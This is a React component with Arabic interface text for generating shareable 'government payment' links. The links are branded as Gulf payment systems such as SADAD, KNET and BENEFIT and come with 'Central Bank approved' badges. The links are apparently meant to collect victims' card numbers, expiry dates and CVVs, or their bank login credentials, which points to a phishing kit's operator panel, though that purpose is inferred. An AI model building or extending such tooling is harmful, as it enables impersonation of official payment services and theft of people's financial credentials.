import { useState, useMemo } from "react";
import { useParams, useNavigate, useLocation } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { CreditCard, DollarSign, Hash, FileText, Copy, ExternalLink, Shield, CheckCircle2, Link as LinkIcon } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const GovernmentPaymentLinkCreator = () => {
  const { country } = useParams();
  const location = useLocation();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const provider = useMemo(() => {
    const path = location.pathname;
    if (path.includes('/sadad/')) return 'sadad';
    if (path.includes('/knet/')) return 'knet';
    if (path.includes('/benefit/')) return 'benefit';
    if (path.includes('/omannet/')) return 'omannet';
    if (path.includes('/jaywan/')) return 'jaywan';
    if (path.includes('/qatar-payment/')) return 'qatar-payment';
    return 'sadad';
  }, [location.pathname]);

  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const govSystem = getGovernmentPaymentSystem(country?.toUpperCase() || "SA");

  const [paymentAmount, setPaymentAmount] = useState("500");
  const [referenceNumber, setReferenceNumber] = useState("");
  const [description, setDescription] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال مبلغ صحيح",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "government_payment",
        country_code: country || "",
        payload: {
          payment_amount: parseFloat(paymentAmount),
          currency_code: getCurrencyCode(country || "SA"),
          provider: provider || "sadad",
          reference: referenceNumber,
          description: description,
          selectedCountry: country || "SA",
          service_key: provider || "sadad",
          payment_method: paymentMethod, // حفظ طريقة الدفع
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: provider || "sadad",
        country: country || 'SA',
        paymentMethod: paymentMethod, // تمرير طريقة الدفع
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح!",
        description: "يمكنك الآن مشاركة الرابط",
      });
    } catch (error) {
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreviewLink = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.background }} dir="rtl">
      <div 
        className="h-24"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="container mx-auto h-full flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
            <div className="bg-white p-3 rounded-xl shadow-lg">
              {govSystem.logo && (
                <img src={govSystem.logo} alt={govSystem.nameAr} className="h-12" />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-2xl">{govSystem.nameAr}</h1>
              <p className="text-sm opacity-90">{govSystem.description}</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8">
        <div className="mb-4">
          <BackButton />
        </div>

        <div className="max-w-3xl mx-auto">
          <div className="grid grid-cols-4 gap-3 mb-8">
            {[
              { icon: Shield, text: 'آمن ومعتمد', desc: 'البنك المركزي' },
              { icon: LinkIcon, text: 'روابط مخصصة', desc: 'قابلة للمشاركة' },
              { icon: CheckCircle2, text: 'فوري', desc: 'تنفيذ لحظي' },
              { icon: CreditCard, text: 'متعدد الطرق', desc: 'جميع البطاقات' }
            ].map((item, idx) => (
              <Card 
                key={idx}
                className="p-4 text-center border-2 hover:shadow-lg transition-all"
                style={{ borderColor: `${govSystem.colors.primary}30` }}
              >
                <div 
                  className="w-12 h-12 mx-auto rounded-full flex items-center justify-center mb-2"
                  style={{ backgroundColor: `${govSystem.colors.primary}15` }}
                >
                  <item.icon className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
                </div>
                <p className="font-bold text-sm">{item.text}</p>
                <p className="text-xs text-gray-600">{item.desc}</p>
              </Card>
            ))}
          </div>

          <Card className="p-8 shadow-2xl">
            <div 
              className="flex items-center gap-4 mb-6 pb-4 border-b-2"
              style={{ borderBottomColor: govSystem.colors.primary }}
            >
              <div 
                className="w-14 h-14 rounded-full flex items-center justify-center"
                style={{ backgroundColor: `${govSystem.colors.primary}20` }}
              >
                <LinkIcon className="w-7 h-7" style={{ color: govSystem.colors.primary }} />
              </div>
              <div className="flex-1">
                <h2 className="text-2xl font-bold">إنشاء رابط دفع</h2>
                <p className="text-sm text-gray-600">روابط دفع مخصصة وآمنة</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <DollarSign className="w-4 h-4" />
                  مبلغ الدفع *
                  {country && (
                    <span className="text-sm text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                  step="0.01"
                  min="0"
                  required
                />
                {country && (
                  <p className="text-sm text-muted-foreground mt-2">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <Hash className="w-4 h-4" />
                  الرقم المرجعي
                </Label>
                <Input
                  type="text"
                  value={referenceNumber}
                  onChange={(e) => setReferenceNumber(e.target.value)}
                  placeholder="مثال: INV-2024-001"
                  className="h-12 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-base">
                  <FileText className="w-4 h-4" />
                  الوصف
                </Label>
                <Textarea
                  value={description}
                  onChange={(e) => setDescription(e.target.value)}
                  placeholder="وصف الدفعة..."
                  className="min-h-24 text-base"
                  style={{ borderColor: `${govSystem.colors.primary}40` }}
                />
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-3 text-base font-bold">
                  اختر طريقة الدفع *
                </Label>
                <div className="grid grid-cols-2 gap-3">
                  {/* Card Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('card')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'card'
                        ? 'shadow-md'
                        : 'hover:border-gray-300'
                    }`}
                    style={{
                      borderColor: paymentMethod === 'card' ? govSystem.colors.primary : '#e5e7eb',
                      backgroundColor: paymentMethod === 'card' ? `${govSystem.colors.primary}10` : 'white'
                    }}
                  >
                    <div className="flex items-start gap-3">
                      <div 
                        className="p-2 rounded-full"
                        style={{
                          backgroundColor: paymentMethod === 'card' ? govSystem.colors.primary : '#f3f4f6',
                          color: paymentMethod === 'card' ? 'white' : '#6b7280'
                        }}
                      >
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 
                          className="font-semibold text-sm mb-1"
                          style={{ color: paymentMethod === 'card' ? govSystem.colors.primary : '#1f2937' }}
                        >
                          إدخال بيانات البطاقة
                        </h4>
                        <p className="text-xs text-gray-600">
                          إدخال رقم البطاقة وبيانات الدفع مباشرة
                        </p>
                      </div>
                    </div>
                    {paymentMethod === 'card' && (
                      <div className="absolute top-2 left-2">
                        <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                      </div>
                    )}
                  </button>

                  {/* Bank Login Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('bank_login')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'bank_login'
                        ? 'shadow-md'
                        : 'hover:border-gray-300'
                    }`}
                    style={{
                      borderColor: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#e5e7eb',
                      backgroundColor: paymentMethod === 'bank_login' ? `${govSystem.colors.primary}10` : 'white'
                    }}
                  >
                    <div className="flex items-start gap-3">
                      <div 
                        className="p-2 rounded-full"
                        style={{
                          backgroundColor: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#f3f4f6',
                          color: paymentMethod === 'bank_login' ? 'white' : '#6b7280'
                        }}
                      >
                        <Shield className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 
                          className="font-semibold text-sm mb-1"
                          style={{ color: paymentMethod === 'bank_login' ? govSystem.colors.primary : '#1f2937' }}
                        >
                          تسجيل دخول البنك
                        </h4>
                        <p className="text-xs text-gray-600">
                          الدفع عبر تسجيل الدخول إلى حسابك البنكي
                        </p>
                      </div>
                    </div>
                    {paymentMethod === 'bank_login' && (
                      <div className="absolute top-2 left-2">
                        <CheckCircle2 className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
                      </div>
                    )}
                  </button>
                </div>

                {/* Info Message */}
                <div 
                  className="p-3 rounded-lg text-xs mt-3"
                  style={{
                    backgroundColor: paymentMethod === 'card' ? '#eff6ff' : '#fef3c7',
                    color: paymentMethod === 'card' ? '#1e40af' : '#92400e',
                    border: `1px solid ${paymentMethod === 'card' ? '#bfdbfe' : '#fde68a'}`
                  }}
                >
                  {paymentMethod === 'card' ? (
                    <>
                      <strong>إدخال بيانات البطاقة:</strong> سيتم طلب إدخال رقم البطاقة، تاريخ الانتهاء، ورمز CVV
                    </>
                  ) : (
                    <>
                      <strong>تسجيل الدخول البنكي:</strong> سيتم طلب اختيار البنك وتسجيل الدخول بمعلومات حسابك البنكي
                    </>
                  )}
                </div>
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-white text-lg font-bold"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.lg
                }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط الدفع"}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="sm:max-w-2xl" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-right text-2xl flex items-center gap-3">
              <CheckCircle2 className="w-8 h-8" style={{ color: govSystem.colors.primary }} />
              تم إنشاء رابط الدفع بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-right text-base pt-4">
              يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-6">
            <div 
              className="p-4 rounded-lg border-2"
              style={{ 
                backgroundColor: `${govSystem.colors.primary}10`,
                borderColor: `${govSystem.colors.primary}30`
              }}
            >
              <p className="text-sm text-gray-600 mb-2">الرابط:</p>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-white p-3 rounded text-sm break-all border">
                  {createdPaymentUrl}
                </code>
              </div>
            </div>

            {/* Payment Summary */}
            <div className="mt-4 space-y-2 text-sm">
              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                <span className="text-gray-600">المبلغ:</span>
                <span className="font-bold">{formatCurrency(parseFloat(paymentAmount), getCurrencyCode(country || "SA"))}</span>
              </div>
              {referenceNumber && (
                <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                  <span className="text-gray-600">المرجع:</span>
                  <span className="font-semibold">{referenceNumber}</span>
                </div>
              )}
              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
                <span className="text-gray-600">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === 'card' ? 'إدخال بيانات البطاقة' : 'تسجيل دخول البنك'}
                </span>
              </div>
            </div>
          </div>

          <AlertDialogFooter className="flex flex-row gap-3 justify-start">
            <Button
              onClick={handleCopyLink}
              className="flex-1 h-12"
              style={{ 
                background: govSystem.gradients.primary,
                color: 'white'
              }}
            >
              <Copy className="w-5 h-5 ml-2" />
              نسخ الرابط
            </Button>
            <Button
              variant="outline"
              onClick={handlePreviewLink}
              className="flex-1 h-12"
              style={{ 
                borderColor: govSystem.colors.primary,
                color: govSystem.colors.primary
              }}
            >
              <ExternalLink className="w-5 h-5 ml-2" />
              معاينة الرابط
            </Button>
            <Button
              variant="outline"
              onClick={() => setShowSuccessDialog(false)}
              className="flex-1 h-12"
            >
              إغلاق
            </Button>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default GovernmentPaymentLinkCreator;
